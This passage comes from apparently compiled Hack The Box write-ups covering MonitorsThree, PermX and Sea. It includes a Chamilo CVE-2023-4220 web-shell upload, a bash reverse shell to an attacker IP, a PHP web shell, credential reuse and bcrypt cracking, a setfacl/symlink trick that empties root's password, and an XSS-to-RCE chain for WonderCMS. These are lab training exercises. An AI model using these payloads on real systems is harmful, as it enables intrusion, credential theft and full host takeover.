<ul> <li>Next we note the <code>session-nonce</code> and URL decode it using CyberChef</li> <li>Once again using CyberChef we paste the <code>server-passphrase</code> and then do the recipe: from base64 -&gt; to hex</li> <li> <p>Following this we open the developer console on the login page and type the following. Where <code>noncedpwd</code> uses the URL decoded value of the BurpSuite intercept. </p> </li> <li> <p>We paste the <code>noncedpwd</code> into the <code>password</code> parameter (URL encoded) in BurpSuite and forward the request. </p> </li> </ul> <p>We will successfully have bypassed authentication and see the <code>duplicati</code> dashboard. </p> <p>Under the <code>About</code> tab we see that the application is running with root privileges. </p> <p>We can abuse this to escalate our privileges by using the backup functionality. These are the steps:</p> <ol> <li>Navigate to <code>Add backup</code> and select <code>Configure a new backup</code>.</li> <li>Next we give it any name and specify <code>No encryption</code>.</li> <li> <p>We choose to do the backup in <code>marcus</code> home directory, but can be anywhere. It is important to navigate to the <code>/source</code> first. </p> </li> <li> <p>For the source data we chose <code>.ssh</code> directory of <code>marcus</code>. </p> </li> <li> <p>Next we turn off <code>Automatically run backups</code> and save.</p> </li> <li> <p>Then run the backup. </p> </li> <li> <p>Following this we navigate to <code>Restore</code> and aim to put the files inside <code>marcus</code> <code>.ssh</code> directory into <code>root</code> <code>.ssh</code> directory. </p> </li> <li> <p>We check all boxes for the restore files and continue.</p> </li> <li> <p>Next we pick the location to be <code>root</code> <code>.ssh</code> directory </p> </li> <li> <p>Once restored, the <code>.ssh</code> directory of <code>root</code> will have <code>marcus</code> SSH keys and we can login as root using previously obtained private key of <code>marcus</code> as <code>root</code>. <pre><code>$ ssh -i marcus-id_rsa root@monitorsthree.htb\nLast login: Wed Dec  4 07:03:32 2024 from 10.10.16.35\nroot@monitorsthree:~# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> ROOT FLAG <pre><code>$ cat root.txt\n6ebfcd64fada5899babc1055b1dd2102\n</code></pre></p> </li> </ol> Flag Value Location user d4cc53d18837a65652b02641e15fb2c2 /home/marcus/user.txt root 6ebfcd64fada5899babc1055b1dd2102 /root/root.txt"}, {"location": "Write-Ups/PermX/", "title": "PermX", "text": ""}, {"location": "Write-Ups/PermX/#initial-enumeration", "title": "Initial Enumeration", "text": ""}, {"location": "Write-Ups/PermX/#nmap", "title": "Nmap", "text": "<p>We first do our port discovery running <code>sudo nmap -p- --min-rate 10000 10.129.71.63</code>. Then we run our script and version scans on the ports we found to be open.</p> <pre><code>$ sudo nmap -p22,80 -sC -sV -oN nmap-full 10.129.71.63      \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-12 11:42 CET\nNmap scan report for 10.129.71.63\nHost is up (0.024s latency).\n\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=\n|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52\n|_http-server-header: Apache/2.4.52 (Ubuntu)\n|_http-title: Did not follow redirect to http://permx.htb\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 9.66 seconds\n</code></pre> <ul> <li>TTL of 63 indicating Linux as well as most likely no containerization in play.</li> <li>Port 20 SSH - Reveals Linux (Ubuntu)</li> <li>Port 80 HTTP - Redirects to <code>http://permx.htb</code></li> </ul> <p>We add <code>permx.htb</code> to our <code>/etc/hosts</code> file.</p>"}, {"location": "Write-Ups/PermX/#port-80", "title": "Port 80", "text": "<p>We visit <code>http://permx.htb</code> in our browser and begin with some manual enumeration by browsing the website.</p> <p></p> <p>We see a fairly standard page with not much to discover manually.</p> <p>Some interesting things to note are that the file extension <code>.html</code> is used for pages on the site and we also see a contact email on the bottom of the page.</p> <p></p> <p>We will continue with doing automated enumeration using Ffuf, trying to discover directories as well as pages (discovered file extension <code>.html</code>).</p> <pre><code>$ ffuf -u http://permx.htb/FUZZ -e html -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ic\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://permx.htb/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n :: Extensions       : html \n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\n                        [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 23ms]\nimg                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 36ms]\ncss                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 29ms]\nlib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 30ms]\njs                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 20ms]\n&lt;--SNIP--&gt;\n</code></pre> <p>Nothing of interest can be found. We continue with fuzzing for possible subdomains using Ffuf.</p> <pre><code>$ ffuf -u http://permx.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.permx.htb\" -fw 18\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://permx.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n :: Header           : Host: FUZZ.permx.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n :: Filter           : Response words: 18\n________________________________________________\n\nwww                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 1375ms]\nlms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 1423ms]\n:: Progress: [114441/114441] :: Job [1/1] :: 1307 req/sec :: Duration: [0:01:14] :: Errors: 0 ::\n</code></pre> <p>We successfully discover two interesting subdomains, so we will add <code>www.permx.htb</code> as well as <code>lms.permx.htb</code> to our <code>/etc/hosts</code> file.</p> <p>Upon browsing to <code>http://www.permx.htb</code> we get greeted with the same site as <code>http://permx.htb</code>.</p> <p></p> <p>Next we browser to <code>http://lms.permx.htb</code>.</p> <p></p> <p>We can see an instance of the <code>Chamilo</code> LMS in use. To fingerprint the version in order to look for possible exploits we <code>curl</code> the <code>README.md</code>, which is accessible on the webpage.</p> <pre><code>$ curl -s http://lms.permx.htb/README.md | grep -i chamilo\n# Chamilo 1.11.x                   \n![PHP Composer](https://github.com/chamilo/chamilo-lms/workflows/PHP%20Composer/badge.svg?branch=1.11.x)\n[![Scrutinizer Code Quality](https://scrutinizer-ci.com/g/chamilo/chamilo-lms/badges/quality-score.png?b=1.11.x)](https://scrutinizer-ci.com/g/chamilo/chamilo-lms/?branch=1.11.x)\n&lt;--SNIP--&gt;\n</code></pre> <p>So some version 1.11.x of <code>Chamilo</code> is being used. </p>"}, {"location": "Write-Ups/PermX/#exploitation", "title": "Exploitation", "text": "<p>Googling for exploits for these versions we come across CVE-2023-4220 with PoC scripts available on <code>GitHub</code> as well.</p> <p>The exploit stems from an unauthenticated file upload vulnerability in <code>bigUpload.php</code> and can be exploited in versions &lt;= 1.11.24.</p> <p>In the following we will use this script to exploit the vulnerability. Reading through the usage examples on the <code>GitHub</code> page, we specify our <code>-u</code> target URL and the <code>-a</code> action to perform for which we chose the <code>scan</code> option in order to quickly be able to confirm the possible vulnerability.</p> <pre><code>$ python3 main.py -u http://lms.permx.htb -a scan\n[+] Target is likely vulnerable. Go ahead. [+]\n</code></pre> <p>With the vulnerability potentially confirmed, we will specify the <code>-a</code> action <code>webshell</code> to upload a web shell and gain command execution.</p> <pre><code>$ python3 main.py -u http://lms.permx.htb -a webshell\nEnter the name of the webshell file that will be placed on the target server (default: webshell.php): shelly.php\n\n[+] Upload successfull [+]\n\nWebshell URL: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shelly.php?cmd=&lt;command&gt;\n</code></pre> <p>Using <code>curl</code> on the provided URL by the script, we can confirm successful command execution using the <code>id</code> command.</p> <pre><code>$ curl -s 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shelly.php?cmd=id'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n</code></pre> <p>We will establish a reverse shell connection now. So first start our listener.</p> <pre><code>$ rlwrap -cAr nc -lvnp 7777\nlistening on [any] 7777 ...\n</code></pre> <p>And run the <code>curl</code> command with a simple <code>bash</code> reverse shell command.</p> <pre><code>$ curl -s 'http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/shelly.php' --get --data-urlencode \"cmd=bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.21/7777 0&gt;&amp;1'\"\n</code></pre> <p>Getting the reverse shell connection established successfully.</p> <pre><code>connect to [10.10.16.21] from (UNKNOWN) [10.129.71.63] 45426\nbash: cannot set terminal process group (1151): Inappropriate ioctl for device\nbash: no job control in this shell\n\nwww-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n\nwww-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ hostname\npermx\n</code></pre>"}, {"location": "Write-Ups/PermX/#host-enumeration", "title": "Host Enumeration", "text": "<p>Upon getting our reverse shell connection on the target host, we first start by doing some manual enumeration on the web roots of <code>/var/www/html</code> and <code>/var/www/chamilo</code> and look for config files. Nothing of great interest is to be found for <code>/var/www/html</code>, however we come across <code>/var/www/chamilo/cli-config.php</code>, which references database credentials.</p> <p>It also reveals another configuration file under <code>./app/config/configuration.php</code>.</p> <pre><code>$ cat cli-config.php\ncat cli-config.php\n&lt;?php\n/* For licensing terms, see /license.txt */\n\n/**\n * Script needed to execute bin/doctrine.php in the command line\n * in order to:.\n *\n * - Generate migrations\n * - Create schema\n * - Update schema\n * - Validate schema\n * - Etc\n */\nuse Doctrine\\ORM\\Tools\\Console\\ConsoleRunner;\n\nrequire_once __DIR__.'/vendor/autoload.php';\n//require_once __DIR__.'/main/inc/lib/api.lib.php';\n$configurationFile = __DIR__.'/app/config/configuration.php';\n\nif (!is_file($configurationFile)) {\n    echo \"File does not exists: $configurationFile\";\n    exit();\n}\n\nrequire_once __DIR__.'/main/inc/global.inc.php';\nrequire_once $configurationFile;\n\n$database = new \\Database();\n$dbParams = [\n    'driver' =&gt; 'pdo_mysql',\n    'host' =&gt; $_configuration['db_host'],\n    'user' =&gt; $_configuration['db_user'],\n    'password' =&gt; $_configuration['db_password'],\n    'dbname' =&gt; $_configuration['main_database'],\n];\n\n$database-&gt;connect($dbParams, realpath(__DIR__).'/', realpath(__DIR__).'/');\n$entityManager = $database::getManager();\n\n$helperSet = ConsoleRunner::createHelperSet($entityManager);\n$dialogHelper = new Symfony\\Component\\Console\\Helper\\QuestionHelper();\n$helperSet-&gt;set($dialogHelper);\n\nreturn $helperSet;\n</code></pre> <p>Taking a look at <code>./app/config/configuration.php</code> and \"grepping\" the variable names mentioned in the above file, we can get the values for <code>db_user</code> as well as <code>db_password</code>.</p> <pre><code>$ cat app/config/configuration.php | grep db_user\n$_configuration['db_user'] = 'chamilo';\n\n$ cat app/config/configuration.php | grep db_password\n$_configuration['db_password'] = '03F6lY3uXAP2bkW8';\n</code></pre> <p>We could also see from the <code>/var/www/chamilo/cli-config.php</code> file that MySQL was being used. So we can try to login using <code>mysql</code>, which is successful.</p> <pre><code>$ mysql -u chamilo -p03F6lY3uXAP2bkW8\n\nWelcome to the MariaDB monitor.  Commands end with ; or \\g.\nYour MariaDB connection id is 54\nServer version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04\n\nCopyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nMariaDB [(none)]&gt; show databases;\nshow databases;\n+--------------------+\n| Database           |\n+--------------------+\n| chamilo            |\n| information_schema |\n+--------------------+\n2 rows in set (0.001 sec)\n</code></pre> <p>We will use the <code>chamilo</code> database and show the tables present in it.</p> <pre><code>MariaDB [(none)]&gt; use chamilo\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A                                                                       \n\nDatabase changed\nMariaDB [chamilo]&gt; show tables;\n&lt;--SNIP--&gt;\n| user                                |\n| user_api_key                        |\n| user_course_category                |\n| user_friend_relation_type           |\n&lt;--SNIP--&gt;\n</code></pre> <p>Discovering the table <code>user</code> which sounds promising. We run the <code>describe user;</code> command to get the column names of the <code>user</code> table and then select the interesting information for us.</p> <pre><code>MariaDB [chamilo]&gt; select username,password from user;\nselect username,password from user;\n+----------+--------------------------------------------------------------+\n| username | password                                                     |\n+----------+--------------------------------------------------------------+\n| admin    | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra |\n| anon     | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS |\n+----------+--------------------------------------------------------------+\n2 rows in set (0.000 sec)\n</code></pre> <p>This appears to be in <code>Bcrypt</code> hash format and we can try to run <code>Hashcat</code> on it.</p> <pre><code>$ ./hashcat hashes/permx/mysql.hashes rockyou.txt -m 3200\n&lt;--SNIP--&gt;\n$2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS:anon\n&lt;--SNIP--&gt;\n</code></pre> <p>This proves to be unsuccessful other than revealing the <code>anon</code> password, which does not get us any further when trying for password reuse.</p> <p>Our next step would be to try for password reuse using the <code>db_password</code> value we obtained through the previously inspected files. For this we first enumerate the users on the target host.</p> <pre><code>$ cat /etc/passwd | grep sh$\nroot:x:0:0:root:/root:/bin/bash\nmtz:x:1000:1000:mtz:/home/mtz:/bin/bash\n</code></pre> <p>And we see one user named <code>mtz</code> other than the <code>root</code> user. Trying to login as this user, using the <code>db_password</code> \"03F6lY3uXAP2bkW8\" we successfully authenticate.</p> <pre><code>$ su -l mtz\nPassword: 03F6lY3uXAP2bkW8\n\nmtz@permx:~$ id\nuid=1000(mtz) gid=1000(mtz) groups=1000(mtz)\n</code></pre> <p>Once authenticated, the user flag can be found in the home directory of user <code>mtz</code>.</p> <pre><code>$ cat user.txt\n74694b6b4527daac6ac1e3b761b0a3bd\n</code></pre>"}, {"location": "Write-Ups/PermX/#privilege-escalation", "title": "Privilege Escalation", "text": "<p>We can run <code>sudo -l</code> to reveal commands we can run with <code>sudo</code> privileges as user <code>mtz</code>.</p> <pre><code>$ sudo -l\nMatching Defaults entries for mtz on permx:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,\n    use_pty\n\nUser mtz may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /opt/acl.sh\n</code></pre> <p>Taking a look at the <code>acl.sh</code> script, it reveals that we can run the <code>setfacl</code> binary as root.</p> <pre><code>$ cat /opt/acl.sh\n#!/bin/bash\n\nif [ \"$#\" -ne 3 ]; then\n    /usr/bin/echo \"Usage: $0 user perm file\"\n    exit 1\nfi\n\nuser=\"$1\"\nperm=\"$2\"\ntarget=\"$3\"\n\nif [[ \"$target\" != /home/mtz/* || \"$target\" == *..* ]]; then\n    /usr/bin/echo \"Access denied.\"\n    exit 1\nfi\n\n# Check if the path is a file\nif [ ! -f \"$target\" ]; then\n    /usr/bin/echo \"Target must be a file.\"\n    exit 1\nfi\n\n/usr/bin/sudo /usr/bin/setfacl -m u:\"$user\":\"$perm\" \"$target\"\n</code></pre> <p>After getting a grasp on what the script does and expects as input, we can go to GTFOBins to look for ways we can possibly escalate our privileges through the <code>setfacl</code> binary the script uses.</p> <p>Under the <code>Sudo</code> section, we can see a possible way to escalate our privileges using this binary and we see this is basically the command the <code>acl.sh</code> script runs too. Now we just need to find a file we can abuse.</p> <p>Furthermore the <code>acl.sh</code> script restricts us to files inside our home directory, however we can bypass this restriction by creating a symbolic link to any file on the file system at our home directory.</p> <p>To finally escalate our privileges, we can do it several ways. One of the simpler ways is to either change the second entry for the <code>root</code> user from <code>x</code> in the <code>/etc/passwd</code> file to empty, meaning no password required to login as <code>root</code>. We could also choose to put the same hash as the <code>mtz</code> user in the <code>/etc/shadow</code> file for the <code>root</code> user, resulting in us being able to login as <code>root</code> using <code>mtz</code> password. In the following we will go with the former approach.</p> <p>We start by creating a symbolic link to the <code>/etc/passwd</code> file into our <code>mtz</code> home directory.</p> <pre><code>$ ln -s /etc/passwd passwd\n$ cat /etc/passwd\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n&lt;--SNIP--&gt;\n</code></pre> <p>We change the permissions to <code>rwx</code> for <code>mtz</code> by abusing the <code>acl.sh</code> script.</p> <pre><code>$ sudo /opt/acl.sh mtz rwx /home/mtz/passwd\n</code></pre> <p>Next we run the following to clear the <code>x</code> in the second entry of the <code>/etc/passwd</code> file.</p> <pre><code>$ echo -e ':%s/^root:[^:]*:/root::/\\nwq!' | /usr/bin/vim.basic -es /etc/passwd\n$ cat /etc/passwd\nroot::0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n&lt;--SNIP--&gt;\n</code></pre> <p>We can confirm that the second entry has been cleared and we can now login as the <code>root</code> user without a password prompt.</p> <pre><code>$ su\n\nroot@permx:/home/mtz# id\nuid=0(root) gid=0(root) groups=0(root)\n</code></pre> <p>The root flag can be found at <code>/root/root.txt</code>.</p> <pre><code># cat root.txt\n78af4a8f5cbed952d6bcd30bf158f280\n</code></pre>"}, {"location": "Write-Ups/PermX/#resources", "title": "Resources", "text": "<ul> <li>Cool way to fingerprint versions when having access to GitHub source code by ippsec.</li> </ul>"}, {"location": "Write-Ups/Sea/", "title": "Sea", "text": ""}, {"location": "Write-Ups/Sea/#initial-enumeration", "title": "Initial Enumeration", "text": "<p>We start with Nmap to discover open ports and services on the target host. First with the <code>-p-</code> and <code>--min-rate 10000</code> flags to potentially get all open TCP ports. Nmap will tell us 22 and 80 as being open. We run a detailed scan for these ports, doing version scanning and a script scan as well.</p> <pre><code>$ sudo nmap -p22,80 -sC -sV -vv -oN nmap-full 10.129.76.181\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-19 15:33 CET\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=\n|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=\n|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z\n80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Sea - Home\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-cookie-flags: \n|   /: \n|     PHPSESSID: \n|_      httponly flag not set\n|_http-server-header: Apache/2.4.41 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre> <ul> <li>TTL of 63 indicating a Linux host as well as possibly no containerization in play.</li> <li>22/TCP SSH: Running SSH on Ubuntu</li> <li>80/TCP HTTP: Apache web server version 2.4.41</li> </ul>"}, {"location": "Write-Ups/Sea/#port-80", "title": "Port 80", "text": "<p>Navigating to the web page first to get an overview.</p> <p><code>http://10.129.76.181</code> </p> <p>We browse through it, clicking on <code>HOW TO PARTICIPATE</code> and we can click on the <code>contact</code> hyperlink which redirects us to <code>http://sea.htb/contact.php</code> </p> <p></p> <p>We add <code>sea.htb</code> to our <code>/etc/hosts</code> file and visit the redirected page again.</p>"}, {"location": "Write-Ups/Sea/#contactphp", "title": "/contact.php", "text": "<p>We can fill out the form and specify our own attack machine IP (<code>http://&lt;ATTACK-IP&gt;/test</code>) in the <code>Website</code> field. Doing so, we will get a response on our listener, which reveals the <code>User-Agent</code> used. From the <code>User-Agent</code> we can see this as being a normal browser, which might indicate that some user clicked on the <code>Website</code> link we provided in the form.</p> <pre><code>$ nc -lvnp 80             \nlistening on [any] 80 ...\nconnect to [10.10.16.25] from (UNKNOWN) [10.129.76.181] 39424\nGET /test HTTP/1.1\nHost: 10.10.16.25\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/117.0.5938.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\n</code></pre>"}, {"location": "Write-Ups/Sea/#curling-for-directories", "title": "Curling for directories", "text": "<p>We can use curl to obtain possible redirects to other resources. Alternatively we can run the <code>Ffuf</code> tool to fuzz for directories recursively, which should find the <code>themes</code> directory as well as the subdirectory <code>bike</code> as well.</p> <pre><code>$ curl -s http://sea.htb | grep -i sea.htb\n        &lt;link rel=\"stylesheet\" href=\"http://sea.htb/themes/bike/css/style.css\"&gt;\n                        &lt;center&gt;&lt;img src=\"http://sea.htb/themes/bike/img/velik71-new-logotip.png\" alt=\"\" /&gt;&lt;/center&gt;\n                                        &lt;a href=\"http://sea.htb/\"&gt;&lt;h1&gt;Sea&lt;/h1&gt;&lt;/a&gt;\n                                                &lt;a class=\"nav-link\" href=\"http://sea.htb/home\"&gt;Home&lt;/a&gt;&lt;/li&gt;&lt;li class=\"nav-item \"&gt;\n                                                &lt;a class=\"nav-link\" href=\"http://sea.htb/how-to-participate\"&gt;How to participate&lt;/a&gt;&lt;/li&gt;\n</code></pre> <p>Successfully discover <code>http://sea.htb/themes/bike</code>.</p> <p></p>"}, {"location": "Write-Ups/Sea/#fuzzing-themesbike", "title": "Fuzzing /themes/bike", "text": "<p>We will use <code>Ffuf</code> to fuzz for some files/directories on <code>/themes/bike</code>.</p> <pre><code>$ ffuf -u http://sea.htb/themes/bike/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -ic\n\n        /'___\\  /'___\\           /'___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v2.1.0-dev\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://sea.htb/themes/bike/FUZZ\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500\n________________________________________________\n\n.html                   [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 36ms]\n.htm                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 88ms]\nimg                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 96ms]\nLICENSE                 [Status: 200, Size: 1067, Words: 152, Lines: 22, Duration: 69ms]\n404                     [Status: 200, Size: 3341, Words: 530, Lines: 85, Duration: 74ms]\nhome                    [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 162ms]\n.                       [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 103ms]\ncss                     [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 3930ms]\n.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 216ms]\n.php                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 4966ms]\n.phtml                  [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 290ms]\n.htc                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 145ms]\nversion                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 110ms]\n&lt;--SNIP--&gt;\n</code></pre> <p>Interesting hits here are <code>LICENSE</code> and <code>version</code>.</p> <p>We visit <code>LICENSE</code> first.</p> <p><code>http://sea.htb/themes/bike/LICENSE</code> </p> <p>We can see <code>turboblack</code> and googling \"turboblack bike theme\" reveals a theme creator for <code>WonderCMS</code>.</p> <p></p> <p>When visiting <code>http://sea.htb/themes/bike/version</code>, we can see a version in use.</p> <p></p> <p>We can assume here that <code>WonderCMS</code> is being used and running on version 3.2.0.</p>"}, {"location": "Write-Ups/Sea/#exploitation", "title": "Exploitation", "text": "<p>Wonder CMS version v3.2.0 through v3.4.2 is vulnerable to a reflected XSS and publicly available PoC code exists. It is possible to chain this XSS vulnerability to an RCE, by further abusing the <code>installModule</code> component to install a malicious theme.</p> <p>Info</p> <p>In the following are two ways to achieve successful remote code execution, by using the proof-of-concept script as well as by writing our own Python script.</p> Proof-of-Concept RCEOwn RCE <p>We run the exploit specifying our attacking IP and port we listen on as well as the target URL (adjusting the PoC to our scenario). This generates our <code>xss.js</code> file and we then copy the link displayed.</p> <p>First we will create our payload. The PoC itself tries to download a PHP reverse shell, however <code>HackTheBox</code> machines have no internet connection, so we need to specify and host our own. We could decide to straight up go with a PHP reverse shell (like <code>pentestmonkey</code>), but I will go the safe route by choosing a simple PHP web shell.</p> <pre><code>&lt;?php system($_GET[\"cmd\"]); ?&gt;\n</code></pre> <p>We put the payload in a file and call it <code>shelly.php</code>.</p> <pre><code>echo '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shelly.php\n</code></pre> <p>Next we create a folder and move our malicious PHP file into it, which is needed to successfully install the module.</p> <pre><code>mkdir shelly &amp;&amp; mv shelly.php shelly/\n</code></pre> <p>Lastly for our payload we zip it up.</p> <pre><code>zip shelly.zip shelly/ -r\n</code></pre> <p>Next we can move on to modify the PoC script.</p> <p>To adjust the target URL we mirror the PoC <code>URL</code> to check if we get the login prompt, which we successfully do at:</p> <p><code>http://sea.htb/index.php?page=loginURL</code> </p> <p>Next we adjust the PoC Python script, we need to change some code, namely the <code>data</code> variable which contains the code for the malicious <code>xss.js</code>:</p> <pre><code>&lt;--SNIP--&gt;\nelse:\ndata = '''\nvar url = \"'''+str(sys.argv[1])+'''\";\nif (url.endsWith(\"/\")) {\nurl = url.slice(0, -1);\n}\nvar urlWithoutLog = url.split(\"/\").slice(0, -1).join(\"/\");\nvar urlWithoutLogBase 